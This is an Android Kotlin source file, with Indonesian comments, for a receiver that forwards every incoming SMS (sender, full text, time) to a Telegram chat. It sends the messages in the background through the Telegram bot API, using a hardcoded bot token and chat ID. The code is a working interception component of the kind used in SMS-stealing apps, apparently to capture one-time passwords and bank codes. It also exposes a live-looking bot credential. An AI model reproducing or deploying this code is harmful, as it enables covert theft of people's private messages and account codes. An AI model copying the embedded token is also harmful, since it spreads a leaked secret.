package com.lastsymp.smsrelay

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.Date

class SmsReceiver : BroadcastReceiver() {

    // ====== CONFIG YANG PENTING BANGET ======
    private val BOT_TOKEN = "8481195310:AAH9bIdbG2i6nMboy_PzVLQ1tCQ6pd9vMkc"
    private val CHAT_ID = "6765982070" // ganti dgn user ID / grup ID Telegram kamu (string)
    // ========================================

    override fun onReceive(context: Context, intent: Intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {

            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (smsMessages.isEmpty()) return

            val sender = smsMessages[0].originatingAddress ?: "unknown"
            val bodyBuilder = StringBuilder()
            for (msg in smsMessages) {
                bodyBuilder.append(msg.messageBody)
            }
            val body = bodyBuilder.toString()

            val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss Z", Locale.getDefault())
                .format(Date())

            val textMessage = """
                📩 SMS Masuk
                👤 Dari: $sender
                ⏰ Waktu: $ts
                💬 Pesan:
                $body
            """.trimIndent()

            // Kirim ke Telegram di thread terpisah biar ga block broadcast
            Thread {
                sendToTelegram(textMessage)
            }.start()
        }
    }

    private fun sendToTelegram(text: String) {
        try {
            val apiUrl =
                "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" +
                        "?chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8") +
                        "&text=" + URLEncoder.encode(text, "UTF-8")

            val url = URL(apiUrl)
            val conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 10000
                readTimeout = 10000
            }

            conn.inputStream.use { /* read to force request */ }
            conn.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}